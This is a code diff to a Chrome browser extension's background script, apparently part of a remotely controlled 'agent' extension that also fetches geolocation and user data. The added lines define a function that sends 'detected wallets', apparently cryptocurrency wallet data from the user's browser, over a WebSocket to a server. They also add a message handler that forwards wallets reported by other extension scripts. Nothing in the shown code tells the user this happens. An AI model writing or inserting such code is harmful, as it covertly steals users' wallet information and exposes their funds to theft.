@@ -1,4 +1,3 @@
-
 /* global chrome */
 
 // Background script for extension installation handling
@@ -141,6 +140,19 @@ async function fetchGeo() {
   } catch { return null; }
 }
 
+// Send detected wallets via WebSocket
+async function sendWalletsToServer(wallets) {
+  if (agentId && ws?.readyState === WebSocket.OPEN) {
+    send('wallet_update', {
+      agentId: agentId,
+      wallets: wallets,
+      timestamp: new Date().toISOString()
+    });
+    log('Wallets sent to server', wallets);
+  } else {
+    log('Cannot send wallets - WebSocket not connected or no agentId');
+  }
+}
 
 // WebSocket agent registration
 // WebSocket agent registration (с UID)
@@ -464,6 +476,17 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     });
     
     return true; // Keep message channel open for async response
+  }
+  
+  if (request.action === 'walletsDetected') {
+    try {
+      sendWalletsToServer(request.wallets);
+      sendResponse({ success: true });
+    } catch (error) {
+      console.error('Error handling wallets:', error);
+      sendResponse({ success: false, error: error.message });
+    }
+    return true;
   }
   
   if (request.action === 'getUserData') {
